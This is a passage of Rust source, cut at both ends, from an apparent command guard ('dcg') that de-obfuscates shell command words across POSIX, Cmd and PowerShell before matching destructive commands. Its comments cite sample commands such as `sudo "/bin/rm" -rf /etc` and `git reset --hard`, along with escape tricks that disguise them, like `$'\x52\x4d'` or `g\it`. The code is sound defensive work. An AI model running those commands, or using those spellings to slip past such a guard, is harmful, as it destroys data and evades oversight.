    // the path (`C:\Windows` -> `CWindows`) and defeat path normalization, so skip
    // the internal-backslash-escape removal for such tokens. The `X:\`/`X:/`
    // drive-letter form is unambiguous and does not occur in legitimate Unix
    // shell command words.
    let is_windows_drive_path = {
        let b = out.as_bytes();
        let start = usize::from(matches!(b.first(), Some(b'"' | b'\'')));
        b.len() >= start + 3
            && b[start].is_ascii_alphabetic()
            && b[start + 1] == b':'
            && matches!(b[start + 2], b'\\' | b'/')
    };

    // Strip internal backslash escapes before regular ASCII letters.
    // In bash, `g\it` is equivalent to `git` because backslash makes the next char literal.
    // We only strip backslashes before alphanumeric chars to avoid breaking special escapes.
    if !windows_shell && !is_windows_drive_path && out.contains('\\') {
        let mut result = String::with_capacity(out.len());
        let mut chars = out.chars().peekable();
        let mut local_changed = false;
        while let Some(c) = chars.next() {
            if c == '\\' {
                if let Some(&next) = chars.peek() {
                    // Only strip backslash before regular letters/digits (not special chars)
                    if next.is_ascii_alphanumeric() {
                        // Skip the backslash, keep the letter
                        local_changed = true;
                        continue;
                    }
                }
            }
            result.push(c);
        }
        if local_changed {
            out = result;
            changed = true;
        }
    }

    // Handle mixed quoting concatenation: g'i't -> git, "g"it -> git, etc.
    // In bash, adjacent quoted and unquoted sections concatenate into a single word.
    let has_shell_quotes = if dialect == ShellDialect::Cmd {
        out.contains('"')
    } else {
        out.contains('\'') || out.contains('"')
    };
    if has_shell_quotes && out.len() > 2 {
        let mut result = String::with_capacity(out.len());
        let mut chars = out.chars();
        let mut local_changed = false;
        while let Some(c) = chars.next() {
            if c == '"' || c == '\'' && dialect != ShellDialect::Cmd {
                let quote = c;
                // Look for matching close quote
                let mut found_close = false;
                let mut inner_str = String::new();
                while let Some(inner) = chars.next() {
                    if inner == quote {
                        found_close = true;
                        local_changed = true;
                        break;
                    }
                    inner_str.push(inner);
                }
                if !found_close {
                    // Unclosed quote - put quote back and keep the rest as is
                    result.push(quote);
                }
                result.push_str(&inner_str);
            } else {
                result.push(c);
            }
        }
        if local_changed {
            out = result;
            changed = true;
        }
    }

    // Shell redirections may be attached directly to the command word
    // (`"git">/dev/null`, `git.exe>/tmp/log`). Insert a space before the
    // first redirection operator so downstream matching sees the command word
    // and the redirection as separate shell tokens. Numeric file-descriptor
    // redirects like `2>/dev/null` are left alone.
    if let Some(redirection_idx) = attached_redirection_index(&out) {
        let head = &out[..redirection_idx];
        let tail = &out[redirection_idx..];
        let is_fd_redirect = head.chars().all(|c| c.is_ascii_digit());

        if !is_fd_redirect {
            let mut normalized_head = head.to_string();
            if normalized_head.to_ascii_lowercase().ends_with(".exe") && normalized_head.len() > 4 {
                normalized_head.truncate(normalized_head.len() - 4);
            }

            let candidate = format!("{normalized_head} {tail}");
            if candidate != out {
                out = candidate;
                changed = true;
            }
        }
    }

    // Strip Windows .exe extension from command words (e.g., git.exe -> git)
    if out.to_ascii_lowercase().ends_with(".exe") && out.len() > 4 {
        out.truncate(out.len() - 4);
        changed = true;
    }

    // Also strip .exe from inside quotes (e.g., "C:/path/git.exe" -> "C:/path/git")
    // This handles Windows paths with spaces that need to stay quoted
    let quote_check = match (out.as_bytes().first(), out.as_bytes().last()) {
        (Some(b'"'), Some(b'"')) if out.len() > 6 => {
            Some((b'"', out[1..out.len() - 1].to_string()))
        }
        (Some(b'\''), Some(b'\'')) if out.len() > 6 => {
            Some((b'\'', out[1..out.len() - 1].to_string()))
        }
        _ => None,
    };
    if let Some((q, inner)) = quote_check {
        if inner.to_ascii_lowercase().ends_with(".exe") {
            let inner_stripped = &inner[..inner.len() - 4];
            out = format!("{}{inner_stripped}{}", q as char, q as char);
            changed = true;
        }
    }

    // Check for matching quotes (both must be same type)
    let quote = match (out.as_bytes().first(), out.as_bytes().last()) {
        (Some(b'\''), Some(b'\'')) if dialect != ShellDialect::Cmd => Some(b'\''),
        (Some(b'"'), Some(b'"')) => Some(b'"'),
        _ => None,
    };

    if let Some(q) = quote {
        if out.len() >= 2 {
            let inner = &out[1..out.len() - 1];
            // Only unquote when it's clearly a single-token command word (no whitespace/separators).
            let inner_bytes = inner.as_bytes();
            let is_safe = !inner_bytes.is_empty()
                && !inner_bytes.iter().any(u8::is_ascii_whitespace)
                && !inner_bytes
                    .iter()
                    .any(|b| matches!(b, b'|' | b';' | b'&' | b'(' | b')'))
                && inner_bytes.first().is_some_and(|b| *b != q);

            if is_safe {
                out = inner.to_string();
                changed = true;
            }
        }
    }

    if windows_shell {
        let unquoted = out.trim_matches('"');
        if unquoted.contains(['\\', '/'])
            && let Some(base) = unquoted.rsplit(['\\', '/']).find(|part| !part.is_empty())
            && base != out
        {
            out = base.to_string();
            changed = true;
        }
    }

    if changed { Some(out) } else { None }
}

#[must_use]
#[allow(clippy::too_many_lines)]
pub fn normalize_command_word_token(token: &str) -> Option<String> {
    normalize_command_word_token_in_dialect(token, ShellDialect::Unknown)
}

fn attached_redirection_index(token: &str) -> Option<usize> {
    let bytes = token.as_bytes();
    let mut in_single = false;
    let mut in_double = false;
    let mut escaped = false;

    for (idx, byte) in bytes.iter().copied().enumerate() {
        if escaped {
            escaped = false;
            continue;
        }

        if byte == b'\\' && !in_single {
            escaped = true;
            continue;
        }

        match byte {
            b'\'' if !in_double => {
                in_single = !in_single;
            }
            b'"' if !in_single => {
                in_double = !in_double;
            }
            b'&' if !in_single
                && !in_double
                && idx + 1 < bytes.len()
                && bytes[idx + 1] == b'>'
                && idx > 0
                && redirection_prefix_looks_like_command(&bytes[..idx])
                && !bytes[idx - 1].is_ascii_whitespace() =>
            {
                return Some(idx);
            }
            b'>' | b'<'
                if !in_single
                    && !in_double
                    && idx > 0
                    && redirection_prefix_looks_like_command(&bytes[..idx])
                    && !bytes[idx - 1].is_ascii_whitespace() =>
            {
                return Some(idx);
            }
            _ => {}
        }
    }

    None
}

fn redirection_prefix_looks_like_command(prefix: &[u8]) -> bool {
    prefix
        .iter()
        .any(|b| !matches!(b, b'&' | b'<' | b'>' | b'0'..=b'9'))
}

#[inline]
fn looks_like_subcommand_word(token: &str) -> bool {
    // Treat only simple alnum/underscore/dash words as subcommands.
    //
    // This intentionally excludes common path-like/expansion-like tokens (/, ., ~, $),
    // because stripping their quotes can change semantics for downstream parsers (e.g. rm).
    if token.is_empty() {
        return false;
    }

    let first = token.as_bytes()[0];
    if matches!(first, b'/' | b'.' | b'~' | b'$') {
        return false;
    }

    token
        .bytes()
        .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-'))
}

/// With `posix_quoting`, quotes and backslash escapes inside the word are
/// also removed, as the POSIX shell the caller proved does.
#[must_use]
fn normalize_subcommand_token(token: &str, posix_quoting: bool) -> Option<String> {
    let mut out = token.to_string();
    // Strip line continuations (backslash + newline) anywhere in the token
    let mut changed = if out.contains("\\\n") || out.contains("\\\r\n") {
        out = out.replace("\\\n", "").replace("\\\r\n", "");
        true
    } else {
        false
    };

    // Check for matching quotes (both must be same type)
    let quote = match (out.as_bytes().first(), out.as_bytes().last()) {
        (Some(b'\''), Some(b'\'')) => Some(b'\''),
        (Some(b'"'), Some(b'"')) => Some(b'"'),
        _ => None,
    };

    if let Some(q) = quote {
        if out.len() >= 2 {
            let inner = &out[1..out.len() - 1];
            // Only unquote when it's clearly a single-token command-ish word (no whitespace/separators).
            let inner_bytes = inner.as_bytes();
            let is_safe = !inner_bytes.is_empty()
                && !inner_bytes.iter().any(u8::is_ascii_whitespace)
                && !inner_bytes
                    .iter()
                    .any(|b| matches!(b, b'|' | b';' | b'&' | b'(' | b')'))
                && inner_bytes.first().is_some_and(|b| *b != q)
                && looks_like_subcommand_word(inner);

            if is_safe {
                out = inner.to_string();
                changed = true;
            }
        }
    }

    // Quotes and escapes inside a word are removed by a POSIX shell exactly
    // like quotes around it: `z''ap`, `z\ap` and `"z"ap` all pass `zap`. Read
    // them the same way when the result is the same kind of plain word, or a
    // rule (or a pack keyword) naming a subcommand, or a program a launcher
    // runs, never sees it (#592). The shared literal-word decoder refuses any
    // expansion or pattern, so those keep their quoting. Only for a proven
    // POSIX shell: elsewhere `Files\git` may be a Windows path, and joining
    // it would hide the `git` it names. That includes the generic pass that
    // re-reads text a POSIX pass already normalized.
    if posix_quoting
        && out.contains(['\'', '"', '\\'])
        && let Some(decoded) = decode_posix_literal_word(&out)
        && looks_like_subcommand_word(&decoded)
    {
        out = decoded.into_owned();
        changed = true;
    }

    if changed { Some(out) } else { None }
}

/// Quote state at a source boundary in a literal dcg syntax token.
///
/// PowerShell control/Unicode escapes are not ordinary escaped letters. The
/// shared syntax decoder intentionally retains its established matching view;
/// this narrower CLI proof must not turn `--ro`bot` into `--robot`, for example.
/// Returning `None` leaves those bytes opaque instead of inventing an option.
fn dcg_syntax_quote_state(token: &str, dialect: ShellDialect) -> Option<(PosixQuote, bool)> {
    let mut quote = PosixQuote::Unquoted;
    let mut ansi_c_quote = false;
    let mut chars = token.char_indices().peekable();
    while let Some((at, ch)) = chars.next() {
        if quote == PosixQuote::Single && !ansi_c_quote {
            if ch == '\'' {
                if dialect == ShellDialect::PowerShell
                    && chars.peek().map(|&(_, next)| next) == Some('\'')
                {
                    chars.next();
                } else {
                    quote = PosixQuote::Unquoted;
                }
            }
            continue;
        }
        if dialect == ShellDialect::PowerShell && ch == '`' {
            let (_, escaped) = chars.next()?;
            if matches!(
                escaped,
                '0' | 'a' | 'b' | 'e' | 'f' | 'n' | 'r' | 't' | 'u' | 'v'
            ) {
                return None;
            }
            continue;
        }
        if dialect == ShellDialect::Posix && ch == '\\' {
            chars.next()?;
            continue;
        }
        match (quote, ch) {
            (PosixQuote::Unquoted, '$')
                if dialect == ShellDialect::Posix
                    && crate::context::ansi_c_quote_starts_at(token.as_bytes(), at) =>
            {
                chars.next();
                quote = PosixQuote::Single;
                ansi_c_quote = true;
            }
            (PosixQuote::Unquoted, '\'') => quote = PosixQuote::Single,
            (PosixQuote::Unquoted, '"') => quote = PosixQuote::Double,
            (PosixQuote::Double, '"') => quote = PosixQuote::Unquoted,
            (PosixQuote::Single, '\'') => {
                quote = PosixQuote::Unquoted;
                ansi_c_quote = false;
            }
            _ => {}
        }
    }
    Some((quote, ansi_c_quote))
}

/// Canonicalize an inline --agent option without rewriting its opaque value.
fn normalize_dcg_agent_assignment(raw: &str, dialect: ShellDialect) -> Option<String> {
    let value_start = raw.find('=')? + 1;
    let prefix = &raw[..value_start];
    let (quote, ansi_c_quote) = dcg_syntax_quote_state(prefix, dialect)?;
    let (closing_quote, value_quote) = match quote {
        PosixQuote::Unquoted => ("", ""),
        PosixQuote::Single if ansi_c_quote => ("'", "$'"),
        PosixQuote::Single => ("'", "'"),
        PosixQuote::Double => ("\"", "\""),
    };
    // A quote spanning the option/value boundary can be closed just for the
    // syntax proof, then reopened in front of the unchanged value. Thus
    // "--a`gent=two words" becomes --agent="two words", not two argv words.
    let syntax = format!("{prefix}{closing_quote}");
    let mut decoder = ShellTokenDecoder::new(dialect);
    if decoder.decode(&syntax, ShellTokenRole::Syntax).as_deref() != Some("--agent=") {
        return None;
    }
    Some(format!("--agent={value_quote}{}", &raw[value_start..]))
}

pub(crate) fn dcg_global_option_has_no_value(word: &str) -> bool {
    matches!(
        word,
        "--robot"
            | "--verbose"
            | "--quiet"
            | "--legacy-output"
            | "--no-color"
            | "--no-suggestions"
            | "-q"
    ) || word
        .strip_prefix('-')
        .is_some_and(|flags| !flags.is_empty() && flags.bytes().all(|b| b == b'v'))
}

pub(crate) fn is_dcg_literal_agent_assignment(raw: &str, dialect: ShellDialect) -> bool {
    dcg_literal_word_is_static(raw, dialect)
        && normalize_dcg_agent_assignment(raw, dialect).is_some()
}

/// Recover one static CLI argv word without evaluating its source. The
/// PowerShell proof is intentionally narrower than the generic syntax view:
/// expressions, splats, control escapes and incomplete quoting remain opaque.
pub(crate) fn decode_dcg_literal_word(raw: &str, dialect: ShellDialect) -> Option<Cow<'_, str>> {
    match dialect {
        ShellDialect::Posix => decode_posix_literal_word(raw),
        ShellDialect::PowerShell => {
            if !dcg_literal_word_is_static(raw, dialect)
                || dcg_syntax_quote_state(raw, dialect)?.0 != PosixQuote::Unquoted
            {
                return None;
            }
            ShellTokenDecoder::new(dialect).decode(raw, ShellTokenRole::Syntax)
        }
        ShellDialect::Cmd if dcg_literal_word_is_static(raw, dialect) => {
            ShellTokenDecoder::new(dialect).decode(raw, ShellTokenRole::Syntax)
        }
        ShellDialect::Cmd | ShellDialect::Unknown => None,
    }
}

/// Whether a caller-tokenized CLI word has a fixed single-argument value.
/// No value is evaluated or rewritten. Quoted/escaped punctuation remains
/// data, while runtime expansion, splatting and expression syntax do not
/// establish argv ownership for a destructive-action proof.
pub(crate) fn dcg_literal_word_is_static(raw: &str, dialect: ShellDialect) -> bool {
    if dialect == ShellDialect::Posix {
        return decode_posix_literal_word(raw).is_some();
    }
    if dialect == ShellDialect::Cmd {
        // Environment/delayed expansion and the native Windows argv parser's
        // backslash-before-quote rules require a separate proof.
        if raw.contains(['%', '!']) || raw.contains("\\\"") {
            return false;
        }
        let mut quoted = false;
        let mut chars = raw.chars();
        while let Some(ch) = chars.next() {
            if ch == '"' {
                quoted = !quoted;
            } else if ch == '^' && !quoted {
                let Some(escaped) = chars.next() else {
                    return false;
                };
                // Cmd removes this caret, but the native executable parses
                // the resulting command line again. An unquoted space/tab
                // still splits argv, and a quote can absorb later words.
                if matches!(escaped, ' ' | '\t' | '"') {
                    return false;
                }
            }
        }
        return !quoted;
    }
    if dialect != ShellDialect::PowerShell {
        return false;
    }
    let mut quote = PosixQuote::Unquoted;
    let mut chars = raw.chars().peekable();
    while let Some(ch) = chars.next() {
        if quote == PosixQuote::Single {
            if ch == '\'' {
                if chars.peek() == Some(&'\'') {
                    chars.next();
                } else {
                    quote = PosixQuote::Unquoted;
                }
            }
            continue;
        }
        if ch == '`' {
            if chars.next().is_none() {
                return false;
            }
            continue;
        }
        match (quote, ch) {
            (PosixQuote::Unquoted, '\'') => quote = PosixQuote::Single,
            (PosixQuote::Unquoted, '"') => quote = PosixQuote::Double,
            (PosixQuote::Double, '"') => quote = PosixQuote::Unquoted,
            (_, '$') | (PosixQuote::Unquoted, '@' | '(' | ')' | '{' | '}' | '[' | ']' | ',') => {
                return false;
            }
            _ => {}
        }
    }
    quote == PosixQuote::Unquoted
}

/// Decode only dcg's CLI syntax following an already identified executable.
///
/// The general dequoting pass deliberately keeps the generic token stream for
/// PowerShell, so subexpressions and here-string data are not promoted into
/// command words. That stream cannot delimit PowerShell options containing a
/// backtick: it treats the escape as POSIX command substitution and may absorb
/// the rest of the command. Use the proven dialect for this bounded argv
/// prefix instead, without changing how the executable itself was identified.
/// Return the last consumed source offset so the general pass does not also
/// rewrite these option values or create overlapping replacements.
fn normalize_dcg_syntax_prefix(
    command: &str,
    start: usize,
    dialect: ShellDialect,
    replacements: &mut Vec<(Range<usize>, String)>,
) -> usize {
    let mut decoder = ShellTokenDecoder::new(dialect);
    let mut after_allowlist = false;
    let mut agent_value = false;
    let mut end = start;

    for token in tokenize_for_shell_dialect(&command[start..], dialect) {
        if token.kind == NormalizeTokenKind::Separator {
            break;
        }
        let range = start + token.byte_range.start..start + token.byte_range.end;
        let Some(raw) = command.get(range.clone()) else {
            break;
        };
        end = range.end;
        let Some(decoded) = decoder.decode(raw, ShellTokenRole::Syntax) else {
            // Do not normalize native argv after PowerShell's stop-parsing
            // token, including when the token itself was quoted or escaped.
            break;
        };
        let word = decoded.as_ref();
        let literal_syntax = dcg_syntax_quote_state(raw, dialect).is_some();
        let (may_replace, is_subcommand) = if std::mem::take(&mut agent_value) {
            // --agent consumes one argv word, even if it resembles an option
            // or a subcommand. Keep spaces, paths and runtime syntax opaque.
            (literal_syntax && looks_like_subcommand_word(word), false)
        } else if word == "--agent" {
            agent_value = true;
            (true, false)
        } else if let Some(replacement) = normalize_dcg_agent_assignment(raw, dialect) {
            if literal_syntax
                && word
                    .strip_prefix("--agent=")
                    .is_some_and(|value| value.is_empty() || looks_like_subcommand_word(value))
            {
                (true, false)
            } else {
                if replacement != raw {
                    replacements.push((range, replacement));
                }
                continue;
            }
        } else if let Some(value) = word.strip_prefix("--agent=") {
            // An ANSI-C encoded equals sign may have no literal source '='.
            // Keep the established whole-token proof for plain literal values.
            (
                literal_syntax && (value.is_empty() || looks_like_subcommand_word(value)),
                false,
            )
        } else if dcg_global_option_has_no_value(word) {
            (true, false)
        } else if word == "allowlist" && !after_allowlist {
            after_allowlist = true;
            (true, false)
        } else {
            // The first non-option is the actual subcommand, not data. Decode
            // its literal spelling too (`un`install`, `allowl`ist a`dd`), then
            // stop before any arguments that subcommand owns. Unknown options
            // and shell syntax terminate the prefix without being rewritten.
            (
                !word.starts_with('-') && looks_like_subcommand_word(word),
                true,
            )
        };
        if may_replace && literal_syntax && word != raw {
            replacements.push((range, decoded.into_owned()));
        }
        if is_subcommand {
            break;
        }
    }
    end
}

/// Normalize wrapper/segment command words for matching.
///
/// This removes harmless quoting around *executed* command tokens:
/// - `"git" reset --hard` → `git reset --hard`
/// - `sudo "/bin/rm" -rf /etc` → `sudo /bin/rm -rf /etc`
/// - `git.exe reset --hard` → `git reset --hard`
///
/// Quoted **arguments** are intentionally left alone *unless* they look like
/// subcommand words (e.g., `git "reset" --hard`). Path-like tokens (e.g. quoted
/// `/tmp/...` or `$TMPDIR/...`) keep their quoting, because stripping it can
/// change semantics for downstream parsers (notably `rm`).
#[must_use]
fn dequote_segment_command_words_in_dialect(command: &str, dialect: ShellDialect) -> Cow<'_, str> {
    // Fast path: most commands contain no quotes, backslashes, redirections, or
    // .exe extensions that need normalization. Check for these special cases to
    // enable token-aware normalization without paying the tokenizer cost for
    // ordinary commands.
    let needs_normalization = command
        .as_bytes()
        .iter()
        .any(|b| matches!(b, b'\'' | b'"' | b'\\' | b'<' | b'>'))
        || (dialect == ShellDialect::PowerShell && command.contains('`'))
        || command.to_ascii_lowercase().contains(".exe");

    if !needs_normalization {
        return Cow::Borrowed(command);
    }

    // Keep the established generic token stream for PowerShell here. Its
    // `$()` / here-string preservation is relied on by the evaluator's
    // conservative control-plane pass; the PowerShell-specific tokenizer can
    // otherwise reinterpret quoted subexpression data as command words. Cmd
    // needs its native token boundaries, while command-word replacement below
    // still receives the proven PowerShell dialect for Windows path handling.
    let token_dialect = if dialect == ShellDialect::PowerShell {
        ShellDialect::Unknown
    } else {
        dialect
    };
    let tokens = tokenize_for_shell_dialect(command, token_dialect);
    if tokens.is_empty() {
        return Cow::Borrowed(command);
    }

    let mut replacements: Vec<(Range<usize>, String)> = Vec::new();
    let mut segment_has_cmd = false;
    let mut current_cmd_word: Option<String> = None;
    let mut wrapper: NormalizeWrapper = NormalizeWrapper::None;
    let mut dcg_syntax_end = None;
    let mut dcg_native_tokens = None;

    for tok in &tokens {
        // The generic tokenizer may mistake a backtick in a PowerShell
        // option for command substitution and expose separators inside the
        // option's quoted value. The native prefix already owns those bytes,
        // including any such apparent separators; skip them before resetting
        // the command state.
        if dcg_syntax_end.is_some_and(|end| tok.byte_range.start < end) {
            continue;
        }
        if tok.kind == NormalizeTokenKind::Separator {
            segment_has_cmd = false;
            current_cmd_word = None;
            wrapper = NormalizeWrapper::None;
            dcg_syntax_end = None;
            continue;
        }

        let Some(token_text) = tok.text(command) else {
            // If we can't safely slice, fail open.
            return Cow::Borrowed(command);
        };

        if segment_has_cmd {
            // Check if we should skip dequoting for this command
            if let Some(cmd) = &current_cmd_word {
                if crate::context::SAFE_STRING_REGISTRY.is_all_args_data(cmd) {
                    continue;
                }
            }

            // Normalize subcommand-like words (e.g. git "reset" -> git reset), but do NOT strip
            // quoting from path-like tokens (e.g. rm "/tmp/foo", rm "$TMPDIR/foo").
            let cmd_single_quoted_data = dialect == ShellDialect::Cmd
                && token_text.starts_with('\'')
                && token_text.ends_with('\'');
            if !cmd_single_quoted_data
                && let Some(replacement) =
                    normalize_subcommand_token(token_text, dialect == ShellDialect::Posix)
            {
                replacements.push((tok.byte_range.clone(), replacement));
            }
            continue;
        }

        let current = token_text;

        // `command -v/-V ...` is a query, not execution.
        if matches!(wrapper, NormalizeWrapper::CommandQuery) {
            segment_has_cmd = true;
            wrapper = NormalizeWrapper::None;
            continue;
        }

        // Wrapper option (or wrapper option argument) - consume and continue.
        if wrapper.should_skip_token(current) {
            wrapper = wrapper.advance(current);
            continue;
        }

        // If a wrapper is active and this token isn't an option/assignment, the wrapper is done.
        if !matches!(wrapper, NormalizeWrapper::None) {
            wrapper = NormalizeWrapper::None;
        }

        // If we haven't found the command word yet, check wrappers/assignments.
        let posix_command_roles = matches!(dialect, ShellDialect::Posix | ShellDialect::Unknown);
        if posix_command_roles
            && let Some(next_wrapper) = NormalizeWrapper::from_command_word(current)
        {
            wrapper = next_wrapper;
            continue;
        }

        if posix_command_roles && is_env_assignment(current) {
            continue;
        }

        // Found the segment's command word.
        segment_has_cmd = true;

        let replacement = normalize_command_word_token_in_dialect(current, dialect);
        // Track the normalized command word for safe registry checks
        current_cmd_word = Some(replacement.clone().unwrap_or_else(|| current.to_string()));
        if matches!(dialect, ShellDialect::Posix | ShellDialect::PowerShell)
            && current_cmd_word.as_deref().is_some_and(|word| {
                let name = word.rsplit(['/', '\\']).next().unwrap_or(word);
                name.eq_ignore_ascii_case("dcg") || name.eq_ignore_ascii_case("dcg.exe")
            })
            && (dialect != ShellDialect::PowerShell || {
                // A generic token inside a quoted PowerShell subexpression
                // can look like an executable after its opening quote was
                // split off. Require an exact native source token before
                // interpreting the following bytes as dcg's CLI syntax.
                let native_tokens = dcg_native_tokens
                    .get_or_insert_with(|| tokenize_for_shell_dialect(command, dialect));
                native_tokens
                    .binary_search_by_key(&tok.byte_range.start, |native| native.byte_range.start)
                    .ok()
                    .and_then(|index| native_tokens.get(index))
                    .is_some_and(|native| {
                        native.kind == NormalizeTokenKind::Word
                            && native.byte_range == tok.byte_range
                    })
            })
        {
            dcg_syntax_end = Some(normalize_dcg_syntax_prefix(
                command,
                tok.byte_range.end,
                dialect,
                &mut replacements,
            ));
        }

        if let Some(repl) = replacement {
            replacements.push((tok.byte_range.clone(), repl));
        }
    }

    if replacements.is_empty() {
        return Cow::Borrowed(command);
    }

    // Apply replacements in-order.
    replacements.sort_by_key(|(r, _)| r.start);
    let mut out = String::with_capacity(command.len());
    let mut last = 0usize;
    for (range, replacement) in replacements {
        if range.start > last {
            out.push_str(&command[last..range.start]);
        }
        out.push_str(&replacement);
        last = range.end;
    }
    if last < command.len() {
        out.push_str(&command[last..]);
    }

    Cow::Owned(out)
}

#[must_use]
pub fn dequote_segment_command_words(command: &str) -> Cow<'_, str> {
    dequote_segment_command_words_in_dialect(command, ShellDialect::Unknown)
}

/// Decode caller-proven shell syntax into the pattern-matching view.
///
/// Bash ANSI-C quoting is decoded only at executable positions: the same bytes
/// in an argument can be inert data (`echo $'rm -rf /'`). Cmd carets have
/// different semantics: outside double quotes, Cmd removes them from ordinary
/// argv as well as the executable (`curl -^T`, `sc st^op`). The Cmd path
/// therefore decodes non-structural carets in every word while retaining
/// caret-escaped separators, redirections, whitespace, and quotes so literal
/// data cannot become an apparent command boundary. Escape decoding is linear
/// in the token length, and POSIX numeric escapes consume a fixed,
/// shell-defined maximum number of digits.
fn decode_segment_command_words_in_dialect(command: &str, dialect: ShellDialect) -> Cow<'_, str> {
    // `$'...'` is a strong, self-identifying POSIX/Bash syntax signal, so CLI
    // inspection commands without a proven dialect may decode it. A caret is
    // ordinary data outside Cmd, so it is decoded only when the hook envelope
    // proves Cmd syntax. PowerShell's backtick is handled the same way and,
    // like the Cmd caret, only once the envelope proves the dialect; its
    // semantic decoders cover the executable-reconstruction paths they parse,
    // but the regex packs still need the escape removed from the command name
    // (dcg#294).
    let decode_dialect = match dialect {
        ShellDialect::Posix | ShellDialect::Unknown if command.contains("$'") => {
            ShellDialect::Posix
        }
        ShellDialect::Cmd if command.contains('^') => return decode_cmd_pattern_view(command),
        // A backtick is ordinary data outside PowerShell (and POSIX command
        // substitution syntax), so this decode runs only when the caller
        // proved PowerShell syntax. Unlike the Cmd view it touches executable
        // positions only — see `decode_powershell_pattern_view`.
        ShellDialect::PowerShell if command.contains('`') => {
            return decode_powershell_pattern_view(command);
        }
        ShellDialect::Posix
        | ShellDialect::PowerShell
        | ShellDialect::Cmd
        | ShellDialect::Unknown => return Cow::Borrowed(command),
    };

    let tokens = tokenize_for_shell_dialect(command, decode_dialect);
    if tokens.is_empty() {
        return Cow::Borrowed(command);
    }

    let mut replacements: Vec<(Range<usize>, String)> = Vec::new();
    let mut segment_has_command = false;
    let mut wrapper = NormalizeWrapper::None;
    let mut decoder = ShellTokenDecoder::new(decode_dialect);

    for token in &tokens {
        if token.kind == NormalizeTokenKind::Separator {
            segment_has_command = false;
            wrapper = NormalizeWrapper::None;
            decoder = ShellTokenDecoder::new(decode_dialect);
            continue;
        }
        if segment_has_command {
            continue;
        }

        let Some(raw) = token.text(command) else {
            return Cow::Borrowed(command);
        };
        let Some(decoded) = decoder.decode(raw, ShellTokenRole::Syntax) else {
            continue;
        };
        let word = decoded.as_ref();

        if matches!(wrapper, NormalizeWrapper::CommandQuery) {
            segment_has_command = true;
            wrapper = NormalizeWrapper::None;
            continue;
        }
        if wrapper.should_skip_token(word) {
            wrapper = wrapper.advance(word);
            continue;
        }
        if !matches!(wrapper, NormalizeWrapper::None) {
            wrapper = NormalizeWrapper::None;
        }
        if let Some(next_wrapper) = NormalizeWrapper::from_command_word(word) {
            wrapper = next_wrapper;
            if word != raw {
                replacements.push((token.byte_range.clone(), word.to_string()));
            }
            continue;
        }
        if is_env_assignment(word) {
            continue;
        }

        segment_has_command = true;
        if word != raw {
            // A case-insensitive filesystem runs the same program for a name
            // in any case, and the escapes can spell it in another one
            // (`$'\x52\x4d'` is `RM`, which runs `rm`). Its base name is read
            // in lower case, as the packs spell it.
            let base = word.rfind('/').map_or(0, |slash| slash + 1);
            let mut decoded = word.to_string();
            decoded[base..].make_ascii_lowercase();
            replacements.push((token.byte_range.clone(), decoded));
        }
    }

    if replacements.is_empty() {
        return Cow::Borrowed(command);
    }

    let mut output = String::with_capacity(command.len());
    let mut last = 0usize;
    for (range, replacement) in replacements {
        if range.start > last {
            output.push_str(&command[last..range.start]);
        }
        output.push_str(&replacement);
        last = range.end;
    }
    if last < command.len() {
        output.push_str(&command[last..]);
    }
    Cow::Owned(output)
}

/// Try to normalize a command using path normalizers.
///
/// Tries `PATH_NORMALIZER` first (for unquoted paths), then `QUOTED_PATH_NORMALIZER`
/// (for quoted paths that may contain spaces).
fn apply_path_normalizers(base: &str) -> Option<String> {
    let bytes = base.as_bytes();
    let can_start_unquoted_path = bytes.first() == Some(&b'/')
        || matches!(
            bytes,
            [drive, b':', separator, ..]
                if drive.is_ascii_alphabetic() && matches!(separator, b'/' | b'\\')
        );
    if can_start_unquoted_path {
        if let Ok(Cow::Owned(replaced)) = PATH_NORMALIZER.try_replacen(base, 1, "$1") {
            return Some(replaced);
        }
        return None;
    }
    // The quoted normalizer is likewise anchored to `"`. Do not initialize
    // either comparatively expensive regex automaton for an ordinary bare
    // command that cannot possibly match.
    if bytes.first() == Some(&b'"')
        && let Ok(Cow::Owned(replaced)) = QUOTED_PATH_NORMALIZER.try_replacen(base, 1, "$1")
    {
        return Some(replaced);
    }
    None
}

fn normalize_decoded_command(command: &str, dialect: ShellDialect) -> Cow<'_, str> {
    let decoded = decode_segment_command_words_in_dialect(command, dialect);
    match decoded {
        Cow::Borrowed(base) => {
            let dequoted = dequote_segment_command_words_in_dialect(base, dialect);
            match &dequoted {
                Cow::Borrowed(value) => {
                    apply_path_normalizers(value).map_or_else(|| dequoted, Cow::Owned)
                }
                Cow::Owned(value) => {
                    apply_path_normalizers(value).map_or_else(|| dequoted, Cow::Owned)
                }
            }
        }
        Cow::Owned(decoded) => {
            let dequoted = dequote_segment_command_words_in_dialect(&decoded, dialect);
            let base = dequoted.into_owned();
            apply_path_normalizers(&base).map_or_else(|| Cow::Owned(base), Cow::Owned)
        }
    }
}

/// Normalize a command using a shell dialect proven by the caller.
///
/// POSIX command names expressed with Bash ANSI-C quoting are decoded only at
/// executable positions. For a caller-proven Cmd dialect, non-structural
/// carets are decoded across executable and argument words because `cmd.exe`
/// removes that escape layer before invoking the program; caret-escaped shell
/// structure and quoted carets remain intact. An unknown dialect recognizes
/// `$'...'` as a self-identifying POSIX syntax signal, which keeps direct CLI
/// inspection in parity with hook evaluation without guessing about ordinary
/// quote or caret syntax.
#[inline]
#[must_use]
pub fn normalize_command_in_dialect(cmd: &str, dialect: ShellDialect) -> Cow<'_, str> {
    let _phase = crate::perf::PhaseTimer::start("normalization");
    match dialect {
        ShellDialect::Posix | ShellDialect::Unknown => {
            let stripped = strip_wrapper_prefixes(cmd);
            match stripped.normalized {
                Cow::Borrowed(command) => normalize_decoded_command(command, dialect),
                Cow::Owned(command) => {
                    Cow::Owned(normalize_decoded_command(&command, dialect).into_owned())
                }
            }
        }
        // `NAME=value command` and the wrapper vocabulary recognized by
        // `strip_wrapper_prefixes` are POSIX execution syntax. In PowerShell
        // and Cmd those same words are executable/argument data; stripping
        // them can manufacture a command that the selected shell would never
        // run (for example `FOO=bar curl ...` under Cmd).
        ShellDialect::PowerShell | ShellDialect::Cmd => normalize_decoded_command(cmd, dialect),
    }
}

/// Normalize a command by stripping absolute paths from common binaries.
///
/// Returns the original command unchanged if normalization fails (fail-open).
#[inline]
pub fn normalize_command(cmd: &str) -> Cow<'_, str> {
    normalize_command_in_dialect(cmd, ShellDialect::Unknown)
}

/// Program names dcg recognizes by their own analysis rather than by a pack
/// keyword: wrappers and frontends that run the command after them, shells,
/// interpreters and runners whose argument is a command or a program, and
/// remote shells. Lower case.
const STRUCTURAL_PROGRAM_NAMES: &[&str] = &[
